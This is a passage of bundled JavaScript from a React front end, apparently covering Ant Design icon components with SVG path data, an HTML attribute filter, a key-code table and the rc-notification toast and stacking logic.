    secondaryColor: "#E6E6E6",
    calculated: !1,
  };
function setTwoToneColors(i) {
  var a = i.primaryColor,
    o = i.secondaryColor;
  (twoToneColorPalette.primaryColor = a),
    (twoToneColorPalette.secondaryColor = o || getSecondaryColor(a)),
    (twoToneColorPalette.calculated = !!o);
}
function getTwoToneColors() {
  return _objectSpread2$1({}, twoToneColorPalette);
}
var IconBase = function (a) {
  var o = a.icon,
    s = a.className,
    tt = a.onClick,
    nt = a.style,
    ot = a.primaryColor,
    st = a.secondaryColor,
    ft = _objectWithoutProperties$1(a, _excluded$f),
    ht = reactExports.useRef(),
    gt = twoToneColorPalette;
  if (
    (ot &&
      (gt = { primaryColor: ot, secondaryColor: st || getSecondaryColor(ot) }),
    useInsertStyles(ht),
    warning$1(
      isIconDefinition(o),
      "icon should be icon definiton, but got ".concat(o)
    ),
    !isIconDefinition(o))
  )
    return null;
  var St = o;
  return (
    St &&
      typeof St.icon == "function" &&
      (St = _objectSpread2$1(
        _objectSpread2$1({}, St),
        {},
        { icon: St.icon(gt.primaryColor, gt.secondaryColor) }
      )),
    generate(
      St.icon,
      "svg-".concat(St.name),
      _objectSpread2$1(
        _objectSpread2$1(
          {
            className: s,
            onClick: tt,
            style: nt,
            "data-icon": St.name,
            width: "1em",
            height: "1em",
            fill: "currentColor",
            "aria-hidden": "true",
          },
          ft
        ),
        {},
        { ref: ht }
      )
    )
  );
};
IconBase.displayName = "IconReact";
IconBase.getTwoToneColors = getTwoToneColors;
IconBase.setTwoToneColors = setTwoToneColors;
function setTwoToneColor(i) {
  var a = normalizeTwoToneColors(i),
    o = _slicedToArray$1(a, 2),
    s = o[0],
    tt = o[1];
  return IconBase.setTwoToneColors({ primaryColor: s, secondaryColor: tt });
}
function getTwoToneColor() {
  var i = IconBase.getTwoToneColors();
  return i.calculated ? [i.primaryColor, i.secondaryColor] : i.primaryColor;
}
var _excluded$e = [
  "className",
  "icon",
  "spin",
  "rotate",
  "tabIndex",
  "onClick",
  "twoToneColor",
];
setTwoToneColor(blue.primary);
var Icon = reactExports.forwardRef(function (i, a) {
  var o = i.className,
    s = i.icon,
    tt = i.spin,
    nt = i.rotate,
    ot = i.tabIndex,
    st = i.onClick,
    ft = i.twoToneColor,
    ht = _objectWithoutProperties$1(i, _excluded$e),
    gt = reactExports.useContext(IconContext),
    St = gt.prefixCls,
    vt = St === void 0 ? "anticon" : St,
    _t = gt.rootClassName,
    Et = classNames(
      _t,
      vt,
      _defineProperty$1(
        _defineProperty$1({}, "".concat(vt, "-").concat(s.name), !!s.name),
        "".concat(vt, "-spin"),
        !!tt || s.name === "loading"
      ),
      o
    ),
    Ct = ot;
  Ct === void 0 && st && (Ct = -1);
  var Pt = nt
      ? {
          msTransform: "rotate(".concat(nt, "deg)"),
          transform: "rotate(".concat(nt, "deg)"),
        }
      : void 0,
    bt = normalizeTwoToneColors(ft),
    xt = _slicedToArray$1(bt, 2),
    yt = xt[0],
    wt = xt[1];
  return reactExports.createElement(
    "span",
    _extends({ role: "img", "aria-label": s.name }, ht, {
      ref: a,
      tabIndex: Ct,
      onClick: st,
      className: Et,
    }),
    reactExports.createElement(IconBase, {
      icon: s,
      primaryColor: yt,
      secondaryColor: wt,
      style: Pt,
    })
  );
});
Icon.displayName = "AntdIcon";
Icon.getTwoToneColor = getTwoToneColor;
Icon.setTwoToneColor = setTwoToneColor;
var CheckCircleFilled = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: CheckCircleFilled$1 })
    );
  },
  RefIcon$c = reactExports.forwardRef(CheckCircleFilled),
  CloseCircleFilled$1 = {
    icon: {
      tag: "svg",
      attrs: {
        "fill-rule": "evenodd",
        viewBox: "64 64 896 896",
        focusable: "false",
      },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M512 64c247.4 0 448 200.6 448 448S759.4 960 512 960 64 759.4 64 512 264.6 64 512 64zm127.98 274.82h-.04l-.08.06L512 466.75 384.14 338.88c-.04-.05-.06-.06-.08-.06a.12.12 0 00-.07 0c-.03 0-.05.01-.09.05l-45.02 45.02a.2.2 0 00-.05.09.12.12 0 000 .07v.02a.27.27 0 00.06.06L466.75 512 338.88 639.86c-.05.04-.06.06-.06.08a.12.12 0 000 .07c0 .03.01.05.05.09l45.02 45.02a.2.2 0 00.09.05.12.12 0 00.07 0c.02 0 .04-.01.08-.05L512 557.25l127.86 127.87c.04.04.06.05.08.05a.12.12 0 00.07 0c.03 0 .05-.01.09-.05l45.02-45.02a.2.2 0 00.05-.09.12.12 0 000-.07v-.02a.27.27 0 00-.05-.06L557.25 512l127.87-127.86c.04-.04.05-.06.05-.08a.12.12 0 000-.07c0-.03-.01-.05-.05-.09l-45.02-45.02a.2.2 0 00-.09-.05.12.12 0 00-.07 0z",
          },
        },
      ],
    },
    name: "close-circle",
    theme: "filled",
  },
  CloseCircleFilled = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: CloseCircleFilled$1 })
    );
  },
  RefIcon$b = reactExports.forwardRef(CloseCircleFilled),
  CloseOutlined$1 = {
    icon: {
      tag: "svg",
      attrs: {
        "fill-rule": "evenodd",
        viewBox: "64 64 896 896",
        focusable: "false",
      },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z",
          },
        },
      ],
    },
    name: "close",
    theme: "outlined",
  },
  CloseOutlined = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: CloseOutlined$1 })
    );
  },
  RefIcon$a = reactExports.forwardRef(CloseOutlined),
  ExclamationCircleFilled$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm-32 232c0-4.4 3.6-8 8-8h48c4.4 0 8 3.6 8 8v272c0 4.4-3.6 8-8 8h-48c-4.4 0-8-3.6-8-8V296zm32 440a48.01 48.01 0 010-96 48.01 48.01 0 010 96z",
          },
        },
      ],
    },
    name: "exclamation-circle",
    theme: "filled",
  },
  ExclamationCircleFilled = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: ExclamationCircleFilled$1 })
    );
  },
  RefIcon$9 = reactExports.forwardRef(ExclamationCircleFilled),
  InfoCircleFilled$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm32 664c0 4.4-3.6 8-8 8h-48c-4.4 0-8-3.6-8-8V456c0-4.4 3.6-8 8-8h48c4.4 0 8 3.6 8 8v272zm-32-344a48.01 48.01 0 010-96 48.01 48.01 0 010 96z",
          },
        },
      ],
    },
    name: "info-circle",
    theme: "filled",
  },
  InfoCircleFilled = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: InfoCircleFilled$1 })
    );
  },
  RefIcon$8 = reactExports.forwardRef(InfoCircleFilled),
  attributes = `accept acceptCharset accessKey action allowFullScreen allowTransparency
    alt async autoComplete autoFocus autoPlay capture cellPadding cellSpacing challenge
    charSet checked classID className colSpan cols content contentEditable contextMenu
    controls coords crossOrigin data dateTime default defer dir disabled download draggable
    encType form formAction formEncType formMethod formNoValidate formTarget frameBorder
    headers height hidden high href hrefLang htmlFor httpEquiv icon id inputMode integrity
    is keyParams keyType kind label lang list loop low manifest marginHeight marginWidth max maxLength media
    mediaGroup method min minLength multiple muted name noValidate nonce open
    optimum pattern placeholder poster preload radioGroup readOnly rel required
    reversed role rowSpan rows sandbox scope scoped scrolling seamless selected
    shape size sizes span spellCheck src srcDoc srcLang srcSet start step style
    summary tabIndex target title type useMap value width wmode wrap`,
  eventsName = `onCopy onCut onPaste onCompositionEnd onCompositionStart onCompositionUpdate onKeyDown
    onKeyPress onKeyUp onFocus onBlur onChange onInput onSubmit onClick onContextMenu onDoubleClick
    onDrag onDragEnd onDragEnter onDragExit onDragLeave onDragOver onDragStart onDrop onMouseDown
    onMouseEnter onMouseLeave onMouseMove onMouseOut onMouseOver onMouseUp onSelect onTouchCancel
    onTouchEnd onTouchMove onTouchStart onScroll onWheel onAbort onCanPlay onCanPlayThrough
    onDurationChange onEmptied onEncrypted onEnded onError onLoadedData onLoadedMetadata
    onLoadStart onPause onPlay onPlaying onProgress onRateChange onSeeked onSeeking onStalled onSuspend onTimeUpdate onVolumeChange onWaiting onLoad onError`,
  propList = ""
    .concat(attributes, " ")
    .concat(eventsName)
    .split(/[\s\n]+/),
  ariaPrefix = "aria-",
  dataPrefix = "data-";
function match$1(i, a) {
  return i.indexOf(a) === 0;
}
function pickAttrs(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !1,
    o;
  a === !1
    ? (o = { aria: !0, data: !0, attr: !0 })
    : a === !0
    ? (o = { aria: !0 })
    : (o = _objectSpread2$1({}, a));
  var s = {};
  return (
    Object.keys(i).forEach(function (tt) {
      ((o.aria && (tt === "role" || match$1(tt, ariaPrefix))) ||
        (o.data && match$1(tt, dataPrefix)) ||
        (o.attr && propList.includes(tt))) &&
        (s[tt] = i[tt]);
    }),
    s
  );
}
function isFragment(i) {
  return i && React$1.isValidElement(i) && i.type === React$1.Fragment;
}
const replaceElement = (i, a, o) =>
  React$1.isValidElement(i)
    ? React$1.cloneElement(i, typeof o == "function" ? o(i.props || {}) : o)
    : a;
function cloneElement(i, a) {
  return replaceElement(i, i, a);
}
const useCSSVarCls = (i) => {
  const [, , , , a] = useToken();
  return a ? `${i}-css-var` : "";
};
var KeyCode = {
    MAC_ENTER: 3,
    BACKSPACE: 8,
    TAB: 9,
    NUM_CENTER: 12,
    ENTER: 13,
    SHIFT: 16,
    CTRL: 17,
    ALT: 18,
    PAUSE: 19,
    CAPS_LOCK: 20,
    ESC: 27,
    SPACE: 32,
    PAGE_UP: 33,
    PAGE_DOWN: 34,
    END: 35,
    HOME: 36,
    LEFT: 37,
    UP: 38,
    RIGHT: 39,
    DOWN: 40,
    PRINT_SCREEN: 44,
    INSERT: 45,
    DELETE: 46,
    ZERO: 48,
    ONE: 49,
    TWO: 50,
    THREE: 51,
    FOUR: 52,
    FIVE: 53,
    SIX: 54,
    SEVEN: 55,
    EIGHT: 56,
    NINE: 57,
    QUESTION_MARK: 63,
    A: 65,
    B: 66,
    C: 67,
    D: 68,
    E: 69,
    F: 70,
    G: 71,
    H: 72,
    I: 73,
    J: 74,
    K: 75,
    L: 76,
    M: 77,
    N: 78,
    O: 79,
    P: 80,
    Q: 81,
    R: 82,
    S: 83,
    T: 84,
    U: 85,
    V: 86,
    W: 87,
    X: 88,
    Y: 89,
    Z: 90,
    META: 91,
    WIN_KEY_RIGHT: 92,
    CONTEXT_MENU: 93,
    NUM_ZERO: 96,
    NUM_ONE: 97,
    NUM_TWO: 98,
    NUM_THREE: 99,
    NUM_FOUR: 100,
    NUM_FIVE: 101,
    NUM_SIX: 102,
    NUM_SEVEN: 103,
    NUM_EIGHT: 104,
    NUM_NINE: 105,
    NUM_MULTIPLY: 106,
    NUM_PLUS: 107,
    NUM_MINUS: 109,
    NUM_PERIOD: 110,
    NUM_DIVISION: 111,
    F1: 112,
    F2: 113,
    F3: 114,
    F4: 115,
    F5: 116,
    F6: 117,
    F7: 118,
    F8: 119,
    F9: 120,
    F10: 121,
    F11: 122,
    F12: 123,
    NUMLOCK: 144,
    SEMICOLON: 186,
    DASH: 189,
    EQUALS: 187,
    COMMA: 188,
    PERIOD: 190,
    SLASH: 191,
    APOSTROPHE: 192,
    SINGLE_QUOTE: 222,
    OPEN_SQUARE_BRACKET: 219,
    BACKSLASH: 220,
    CLOSE_SQUARE_BRACKET: 221,
    WIN_KEY: 224,
    MAC_FF_META: 224,
    WIN_IME: 229,
    isTextModifyingKeyEvent: function (a) {
      var o = a.keyCode;
      if (
        (a.altKey && !a.ctrlKey) ||
        a.metaKey ||
        (o >= KeyCode.F1 && o <= KeyCode.F12)
      )
        return !1;
      switch (o) {
        case KeyCode.ALT:
        case KeyCode.CAPS_LOCK:
        case KeyCode.CONTEXT_MENU:
        case KeyCode.CTRL:
        case KeyCode.DOWN:
        case KeyCode.END:
        case KeyCode.ESC:
        case KeyCode.HOME:
        case KeyCode.INSERT:
        case KeyCode.LEFT:
        case KeyCode.MAC_FF_META:
        case KeyCode.META:
        case KeyCode.NUMLOCK:
        case KeyCode.NUM_CENTER:
        case KeyCode.PAGE_DOWN:
        case KeyCode.PAGE_UP:
        case KeyCode.PAUSE:
        case KeyCode.PRINT_SCREEN:
        case KeyCode.RIGHT:
        case KeyCode.SHIFT:
        case KeyCode.UP:
        case KeyCode.WIN_KEY:
        case KeyCode.WIN_KEY_RIGHT:
          return !1;
        default:
          return !0;
      }
    },
    isCharacterKey: function (a) {
      if (
        (a >= KeyCode.ZERO && a <= KeyCode.NINE) ||
        (a >= KeyCode.NUM_ZERO && a <= KeyCode.NUM_MULTIPLY) ||
        (a >= KeyCode.A && a <= KeyCode.Z) ||
        (window.navigator.userAgent.indexOf("WebKit") !== -1 && a === 0)
      )
        return !0;
      switch (a) {
        case KeyCode.SPACE:
        case KeyCode.QUESTION_MARK:
        case KeyCode.NUM_PLUS:
        case KeyCode.NUM_MINUS:
        case KeyCode.NUM_PERIOD:
        case KeyCode.NUM_DIVISION:
        case KeyCode.SEMICOLON:
        case KeyCode.DASH:
        case KeyCode.EQUALS:
        case KeyCode.COMMA:
        case KeyCode.PERIOD:
        case KeyCode.SLASH:
        case KeyCode.APOSTROPHE:
        case KeyCode.SINGLE_QUOTE:
        case KeyCode.OPEN_SQUARE_BRACKET:
        case KeyCode.BACKSLASH:
        case KeyCode.CLOSE_SQUARE_BRACKET:
          return !0;
        default:
          return !1;
      }
    },
  },
  Notify = reactExports.forwardRef(function (i, a) {
    var o = i.prefixCls,
      s = i.style,
      tt = i.className,
      nt = i.duration,
      ot = nt === void 0 ? 4.5 : nt,
      st = i.showProgress,
      ft = i.pauseOnHover,
      ht = ft === void 0 ? !0 : ft,
      gt = i.eventKey,
      St = i.content,
      vt = i.closable,
      _t = i.closeIcon,
      Et = _t === void 0 ? "x" : _t,
      Ct = i.props,
      Pt = i.onClick,
      bt = i.onNoticeClose,
      xt = i.times,
      yt = i.hovering,
      wt = reactExports.useState(!1),
      $t = _slicedToArray$1(wt, 2),
      kt = $t[0],
      Rt = $t[1],
      It = reactExports.useState(0),
      Ot = _slicedToArray$1(It, 2),
      Nt = Ot[0],
      zt = Ot[1],
      Bt = reactExports.useState(0),
      Wt = _slicedToArray$1(Bt, 2),
      Gt = Wt[0],
      Vt = Wt[1],
      Mt = yt || kt,
      Ft = ot > 0 && st,
      Tt = function () {
        bt(gt);
      },
      At = function (Kt) {
        (Kt.key === "Enter" ||
          Kt.code === "Enter" ||
          Kt.keyCode === KeyCode.ENTER) &&
          Tt();
      };
    reactExports.useEffect(
      function () {
        if (!Mt && ot > 0) {
          var Ht = Date.now() - Gt,
            Kt = setTimeout(function () {
              Tt();
            }, ot * 1e3 - Gt);
          return function () {
            ht && clearTimeout(Kt), Vt(Date.now() - Ht);
          };
        }
      },
      [ot, Mt, xt]
    ),
      reactExports.useEffect(
        function () {
          if (!Mt && Ft && (ht || Gt === 0)) {
            var Ht = performance.now(),
              Kt,
              qt = function Qt() {
                cancelAnimationFrame(Kt),
                  (Kt = requestAnimationFrame(function (Zt) {
                    var Jt = Zt + Gt - Ht,
                      er = Math.min(Jt / (ot * 1e3), 1);
                    zt(er * 100), er < 1 && Qt();
                  }));
              };
            return (
              qt(),
              function () {
                ht && cancelAnimationFrame(Kt);
              }
            );
          }
        },
        [ot, Gt, Mt, Ft, xt]
      );
    var Lt = reactExports.useMemo(
        function () {
          return _typeof(vt) === "object" && vt !== null
            ? vt
            : vt
            ? { closeIcon: Et }
            : {};
        },
        [vt, Et]
      ),
      jt = pickAttrs(Lt, !0),
      Dt = 100 - (!Nt || Nt < 0 ? 0 : Nt > 100 ? 100 : Nt),
      Ut = "".concat(o, "-notice");
    return reactExports.createElement(
      "div",
      _extends({}, Ct, {
        ref: a,
        className: classNames(
          Ut,
          tt,
          _defineProperty$1({}, "".concat(Ut, "-closable"), vt)
        ),
        style: s,
        onMouseEnter: function (Kt) {
          var qt;
          Rt(!0),
            Ct == null ||
              (qt = Ct.onMouseEnter) === null ||
              qt === void 0 ||
              qt.call(Ct, Kt);
        },
        onMouseLeave: function (Kt) {
          var qt;
          Rt(!1),
            Ct == null ||
              (qt = Ct.onMouseLeave) === null ||
              qt === void 0 ||
              qt.call(Ct, Kt);
        },
        onClick: Pt,
      }),
      reactExports.createElement(
        "div",
        { className: "".concat(Ut, "-content") },
        St
      ),
      vt &&
        reactExports.createElement(
          "a",
          _extends(
            {
              tabIndex: 0,
              className: "".concat(Ut, "-close"),
              onKeyDown: At,
              "aria-label": "Close",
            },
            jt,
            {
              onClick: function (Kt) {
                Kt.preventDefault(), Kt.stopPropagation(), Tt();
              },
            }
          ),
          Lt.closeIcon
        ),
      Ft &&
        reactExports.createElement(
          "progress",
          { className: "".concat(Ut, "-progress"), max: "100", value: Dt },
          Dt + "%"
        )
    );
  }),
  NotificationContext = React$1.createContext({}),
  NotificationProvider = function (a) {
    var o = a.children,
      s = a.classNames;
    return React$1.createElement(
      NotificationContext.Provider,
      { value: { classNames: s } },
      o
    );
  },
  DEFAULT_OFFSET$1 = 8,
  DEFAULT_THRESHOLD = 3,
  DEFAULT_GAP = 16,
  useStack = function (a) {
    var o = {
      offset: DEFAULT_OFFSET$1,
      threshold: DEFAULT_THRESHOLD,
      gap: DEFAULT_GAP,
    };
    if (a && _typeof(a) === "object") {
      var s, tt, nt;
      (o.offset =
        (s = a.offset) !== null && s !== void 0 ? s : DEFAULT_OFFSET$1),
        (o.threshold =
          (tt = a.threshold) !== null && tt !== void 0
            ? tt
            : DEFAULT_THRESHOLD),
        (o.gap = (nt = a.gap) !== null && nt !== void 0 ? nt : DEFAULT_GAP);
    }
    return [!!a, o];
  },
  _excluded$d = ["className", "style", "classNames", "styles"],
  NoticeList = function (a) {
    var o = a.configList,
      s = a.placement,
      tt = a.prefixCls,
      nt = a.className,
      ot = a.style,
      st = a.motion,
      ft = a.onAllNoticeRemoved,
      ht = a.onNoticeClose,
      gt = a.stack,
      St = reactExports.useContext(NotificationContext),
      vt = St.classNames,
      _t = reactExports.useRef({}),
      Et = reactExports.useState(null),
      Ct = _slicedToArray$1(Et, 2),
      Pt = Ct[0],
      bt = Ct[1],
      xt = reactExports.useState([]),
      yt = _slicedToArray$1(xt, 2),
      wt = yt[0],
      $t = yt[1],
      kt = o.map(function (Mt) {
        return { config: Mt, key: String(Mt.key) };
      }),
      Rt = useStack(gt),
      It = _slicedToArray$1(Rt, 2),
      Ot = It[0],
      Nt = It[1],
      zt = Nt.offset,
      Bt = Nt.threshold,
      Wt = Nt.gap,
      Gt = Ot && (wt.length > 0 || kt.length <= Bt),
      Vt = typeof st == "function" ? st(s) : st;
    return (
      reactExports.useEffect(
        function () {
          Ot &&
            wt.length > 1 &&
            $t(function (Mt) {
              return Mt.filter(function (Ft) {
                return kt.some(function (Tt) {
                  var At = Tt.key;
                  return Ft === At;
                });
              });
            });
        },
        [wt, kt, Ot]
      ),
      reactExports.useEffect(
        function () {
          var Mt;
          if (
            Ot &&
            _t.current[
              (Mt = kt[kt.length - 1]) === null || Mt === void 0
                ? void 0
                : Mt.key
            ]
          ) {
            var Ft;
            bt(
              _t.current[
                (Ft = kt[kt.length - 1]) === null || Ft === void 0
                  ? void 0
                  : Ft.key
              ]
            );
          }
        },
        [kt, Ot]
      ),
      React$1.createElement(
        CSSMotionList,
        _extends(
          {
            key: s,
            className: classNames(
              tt,
              "".concat(tt, "-").concat(s),
              vt == null ? void 0 : vt.list,
              nt,
              _defineProperty$1(
                _defineProperty$1({}, "".concat(tt, "-stack"), !!Ot),
                "".concat(tt, "-stack-expanded"),
                Gt
              )
            ),
            style: ot,
            keys: kt,
            motionAppear: !0,
          },
          Vt,
          {
            onAllRemoved: function () {
              ft(s);
            },
          }
        ),
        function (Mt, Ft) {
          var Tt = Mt.config,
            At = Mt.className,
            Lt = Mt.style,
            jt = Mt.index,
            Dt = Tt,
            Ut = Dt.key,
            Ht = Dt.times,
            Kt = String(Ut),
            qt = Tt,
            Qt = qt.className,
            Zt = qt.style,
            Jt = qt.classNames,
            er = qt.styles,
            sr = _objectWithoutProperties$1(qt, _excluded$d),
            nr = kt.findIndex(function (rr) {
              return rr.key === Kt;
            }),
            tr = {};
          if (Ot) {
            var Xt = kt.length - 1 - (nr > -1 ? nr : jt - 1),
              hr = s === "top" || s === "bottom" ? "-50%" : "0";
            if (Xt > 0) {
              var cr, yr, vr;
              tr.height = Gt
                ? (cr = _t.current[Kt]) === null || cr === void 0
                  ? void 0
                  : cr.offsetHeight
                : Pt == null
                ? void 0
                : Pt.offsetHeight;
              for (var xr = 0, Sr = 0; Sr < Xt; Sr++) {
                var or;
                xr +=
                  ((or = _t.current[kt[kt.length - 1 - Sr].key]) === null ||
                  or === void 0
                    ? void 0
                    : or.offsetHeight) + Wt;
              }
              var mr = (Gt ? xr : Xt * zt) * (s.startsWith("top") ? 1 : -1),
                Yt =
                  !Gt &&
                  Pt !== null &&
                  Pt !== void 0 &&
                  Pt.offsetWidth &&
                  (yr = _t.current[Kt]) !== null &&
                  yr !== void 0 &&
                  yr.offsetWidth
                    ? ((Pt == null ? void 0 : Pt.offsetWidth) -
                        zt * 2 * (Xt < 3 ? Xt : 3)) /
                      ((vr = _t.current[Kt]) === null || vr === void 0
                        ? void 0
                        : vr.offsetWidth)
                    : 1;
              tr.transform = "translate3d("
                .concat(hr, ", ")
                .concat(mr, "px, 0) scaleX(")
                .concat(Yt, ")");
            } else tr.transform = "translate3d(".concat(hr, ", 0, 0)");
          }
          return React$1.createElement(
            "div",
            {
              ref: Ft,
              className: classNames(
                "".concat(tt, "-notice-wrapper"),
                At,
                Jt == null ? void 0 : Jt.wrapper
              ),
              style: _objectSpread2$1(
                _objectSpread2$1(_objectSpread2$1({}, Lt), tr),
                er == null ? void 0 : er.wrapper
              ),
              onMouseEnter: function () {
                return $t(function (ar) {
                  return ar.includes(Kt)
                    ? ar
                    : [].concat(_toConsumableArray(ar), [Kt]);
                });
              },
              onMouseLeave: function () {
                return $t(function (ar) {
                  return ar.filter(function (gr) {
                    return gr !== Kt;
                  });
                });
              },
            },
            React$1.createElement(
              Notify,
              _extends({}, sr, {
                ref: function (ar) {
                  nr > -1 ? (_t.current[Kt] = ar) : delete _t.current[Kt];
                },
                prefixCls: tt,
                classNames: Jt,
                styles: er,
                className: classNames(Qt, vt == null ? void 0 : vt.notice),
                style: Zt,
                times: Ht,
                key: Ut,
                eventKey: Ut,
                onNoticeClose: ht,
                hovering: Ot && wt.length > 0,
              })
            )
          );
        }
      )
    );
  },
  Notifications = reactExports.forwardRef(function (i, a) {
    var o = i.prefixCls,
      s = o === void 0 ? "rc-notification" : o,
      tt = i.container,
      nt = i.motion,
      ot = i.maxCount,
      st = i.className,
      ft = i.style,
      ht = i.onAllRemoved,
      gt = i.stack,
      St = i.renderNotifications,
      vt = reactExports.useState([]),
      _t = _slicedToArray$1(vt, 2),
      Et = _t[0],
      Ct = _t[1],
      Pt = function (Ot) {
        var Nt,
          zt = Et.find(function (Bt) {
            return Bt.key === Ot;
          });
        zt == null ||
          (Nt = zt.onClose) === null ||
          Nt === void 0 ||
          Nt.call(zt),
          Ct(function (Bt) {
            return Bt.filter(function (Wt) {
              return Wt.key !== Ot;
            });
          });
      };
    reactExports.useImperativeHandle(a, function () {
      return {
        open: function (Ot) {
          Ct(function (Nt) {
            var zt = _toConsumableArray(Nt),
              Bt = zt.findIndex(function (Vt) {
                return Vt.key === Ot.key;
              }),
              Wt = _objectSpread2$1({}, Ot);
            if (Bt >= 0) {
              var Gt;
              (Wt.times =
                (((Gt = Nt[Bt]) === null || Gt === void 0
                  ? void 0
                  : Gt.times) || 0) + 1),
                (zt[Bt] = Wt);
            } else (Wt.times = 0), zt.push(Wt);
            return ot > 0 && zt.length > ot && (zt = zt.slice(-ot)), zt;
          });
        },
        close: function (Ot) {
          Pt(Ot);
        },
        destroy: function () {
          Ct([]);
        },
      };
    });
    var bt = reactExports.useState({}),
      xt = _slicedToArray$1(bt, 2),
      yt = xt[0],
      wt = xt[1];
    reactExports.useEffect(
      function () {
        var It = {};
        Et.forEach(function (Ot) {
          var Nt = Ot.placement,
            zt = Nt === void 0 ? "topRight" : Nt;
          zt && ((It[zt] = It[zt] || []), It[zt].push(Ot));
        }),
          Object.keys(yt).forEach(function (Ot) {
            It[Ot] = It[Ot] || [];
          }),
          wt(It);
      },
      [Et]
    );
    var $t = function (Ot) {
        wt(function (Nt) {
          var zt = _objectSpread2$1({}, Nt),
            Bt = zt[Ot] || [];
          return Bt.length || delete zt[Ot], zt;
        });
      },
      kt = reactExports.useRef(!1);
    if (
      (reactExports.useEffect(
        function () {
          Object.keys(yt).length > 0
            ? (kt.current = !0)
            : kt.current && (ht == null || ht(), (kt.current = !1));
        },
        [yt]
      ),
      !tt)
    )
      return null;
    var Rt = Object.keys(yt);
    return reactDomExports.createPortal(
      reactExports.createElement(
        reactExports.Fragment,
        null,
        Rt.map(function (It) {
          var Ot = yt[It],
            Nt = reactExports.createElement(NoticeList, {
              key: It,
              configList: Ot,
              placement: It,
              prefixCls: s,
              className: st == null ? void 0 : st(It),
              style: ft == null ? void 0 : ft(It),
              motion: nt,
              onNoticeClose: Pt,
              onAllNoticeRemoved: $t,
              stack: gt,
            });
          return St ? St(Nt, { prefixCls: s, key: It }) : Nt;
        })
      ),
      tt
    );
  }),
  _excluded$c = [
    "getContainer",
    "motion",
    "prefixCls",
    "maxCount",
    "className",
    "style",
    "onAllRemoved",
    "stack",
    "renderNotifications",
  ],
  defaultGetContainer = function () {
    return document.body;
  },
  uniqueKey = 0;
function mergeConfig() {
  for (var i = {}, a = arguments.length, o = new Array(a), s = 0; s < a; s++)
    o[s] = arguments[s];
  return (
    o.forEach(function (tt) {
      tt &&
        Object.keys(tt).forEach(function (nt) {
          var ot = tt[nt];
          ot !== void 0 && (i[nt] = ot);
        });
    }),
    i
  );
}
function useNotification() {
  var i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {},
    a = i.getContainer,
    o = a === void 0 ? defaultGetContainer : a,
    s = i.motion,
    tt = i.prefixCls,
    nt = i.maxCount,
    ot = i.className,
    st = i.style,
    ft = i.onAllRemoved,
    ht = i.stack,
    gt = i.renderNotifications,
    St = _objectWithoutProperties$1(i, _excluded$c),
    vt = reactExports.useState(),
    _t = _slicedToArray$1(vt, 2),
    Et = _t[0],
    Ct = _t[1],
    Pt = reactExports.useRef(),
    bt = reactExports.createElement(Notifications, {
      container: Et,
      ref: Pt,
      prefixCls: tt,
      motion: s,
      maxCount: nt,
      className: ot,
      style: st,
      onAllRemoved: ft,
      stack: ht,
      renderNotifications: gt,
    }),
    xt = reactExports.useState([]),
    yt = _slicedToArray$1(xt, 2),
    wt = yt[0],
    $t = yt[1],
    kt = reactExports.useMemo(function () {
      return {
        open: function (It) {
          var Ot = mergeConfig(St, It);
          (Ot.key === null || Ot.key === void 0) &&
            ((Ot.key = "rc-notification-".concat(uniqueKey)), (uniqueKey += 1)),
            $t(function (Nt) {
              return [].concat(_toConsumableArray(Nt), [
                { type: "open", config: Ot },
              ]);
            });
        },
        close: function (It) {
          $t(function (Ot) {
            return [].concat(_toConsumableArray(Ot), [
              { type: "close", key: It },
            ]);
          });
        },
        destroy: function () {
          $t(function (It) {
            return [].concat(_toConsumableArray(It), [{ type: "destroy" }]);
          });
        },
      };
    }, []);
  return (
    reactExports.useEffect(function () {
      Ct(o());
    }),
    reactExports.useEffect(
      function () {
        Pt.current &&
          wt.length &&
          (wt.forEach(function (Rt) {
            switch (Rt.type) {
              case "open":
                Pt.current.open(Rt.config);
                break;
              case "close":
                Pt.current.close(Rt.key);
                break;
              case "destroy":
                Pt.current.destroy();
                break;
            }
          }),
          $t(function (Rt) {
            return Rt.filter(function (It) {
              return !wt.includes(It);
            });
          }));
      },
      [wt]
    ),
    [kt, bt]
  );
}
var LoadingOutlined$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "0 0 1024 1024", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
